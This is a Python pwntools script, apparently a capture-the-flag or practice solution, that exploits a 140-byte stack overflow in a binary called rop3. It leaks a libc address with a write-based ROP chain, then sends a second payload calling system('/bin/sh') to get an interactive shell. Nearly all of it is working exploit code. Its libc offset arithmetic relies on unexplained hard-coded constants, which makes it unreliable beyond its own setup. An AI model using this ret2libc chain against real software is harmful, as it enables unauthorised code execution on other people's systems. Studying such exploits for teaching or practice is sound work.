from pwn import *
elf = ELF("./rop3")
io=elf.process()
LIBC= ELF("./libc-2.31.so")


ret = 0x8048199
popret = 0x8048344
pop2ret = 0x8048442
pop3ret = 0x804855d
pop4ret = 0x804855c
addesp_12 = 0x8048341
addesp_44 = 0x8048559


bsh=0xf7f65352

offset = 140
rop_loaded=ROP(elf)
libc_offset= 0x28420




libc_func="write"


    

main_plt=elf.symbols['main']
pop_ebx=(rop_loaded.find_gadget(['pop ebx','ret']))[0]
ret=(rop_loaded.find_gadget(['ret']))[0]
printf_plt= LIBC.symbols['printf']
print("PRINTF_PLT : " + hex(printf_plt))

log.info("MAIN START: " + hex(main_plt))

log.info("pop ebx; ret  gadget:" +hex(pop_ebx))
log.info("ret gadget: " + hex(ret))

write_plt=elf.symbols['write']
binsh = next(LIBC.search(b"/bin/sh"))
system = LIBC.sym["system"]
exit= LIBC.sym["exit"]
log.info("BINSH STRING : " + hex(binsh))
log.info("SYSTEM ADD : " +hex(system))
log.info("EXIT ADD : " +hex(exit))

print("LIBC FUNC VAR : " + hex(write_plt))

gdb.attach(io,"b*0x804849c")
log.info("MAIN ADD : " + hex(main_plt))

payload= b'a' *140

ropchain = p32(write_plt)
ropchain+= p32(main_plt) 
ropchain += p32(0x1)
ropchain += p32(0x804a000)  #read function 
ropchain += p32(0x4) 


payload=payload + ropchain


io.sendline(payload)

recieved = io.recv().strip()
testByte = recieved
listTestByte = list(testByte)


leak = int.from_bytes(recieved, "little")




log.info("Leaked libc address, : "+ hex(leak))

base = leak - LIBC.symbols['read'] 
base = base + 0x39b60

log.info("LIBC base @ %s" % hex(base))

payload = ''

sys_libc= base + system + 0x10 
sys_libc= sys_libc - 0x2d000
log.info("SYSTEM ADDRESS + BASE : " + hex(sys_libc)) 
exit_libc= base + exit 
exit_libc = exit_libc - 0x2ec40
binsh_libc = base + binsh
binsh_libc = binsh_libc - 0x45258

log.info("EXIT LIBC : " + hex(exit_libc))
log.info("BINSH STR ADD : " + hex(binsh_libc))

payload = b'a'*140
payload+=p32(sys_libc)
payload+=p32(exit_libc)
payload+=p32(binsh_libc)

payload+=p32(0xdeadbeef)
payload+=p32(0)


io.sendline(payload)

io.interactive()

